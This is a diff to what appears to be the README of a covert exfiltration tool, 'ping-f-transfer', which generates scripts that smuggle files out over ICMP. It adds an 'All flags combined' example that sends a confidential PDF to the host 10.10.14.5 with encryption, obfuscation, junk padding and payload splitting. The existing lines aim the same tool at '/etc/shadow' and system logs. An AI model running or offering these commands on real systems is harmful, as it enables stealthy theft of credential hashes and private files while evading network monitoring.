@@ -232,3 +232,20 @@ ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l perl \
 ping-f-transfer generate -f '/var/log/syslog' -i 10.10.14.5 -l ruby \
   -p 0.3 --junk 2 --estimate-transfer-time
 ```
+
+### All flags combined
+
+Using every available flag in a single command:
+
+```bash
+ping-f-transfer generate -f '/home/user/confidential.pdf' -i 10.10.14.5 -l python \
+  -p 0.01 -r 0.003 \
+  --junk 2 --randomize-junk \
+  --compress \
+  --encrypt aes-128 --random-passphrase 32 \
+  --randomize-var --obfuscate-strings \
+  --split-payload 3 \
+  --capture-packets-filename capture_all.hex \
+  --decoded-filename recovered.pdf \
+  --no-banner
+```
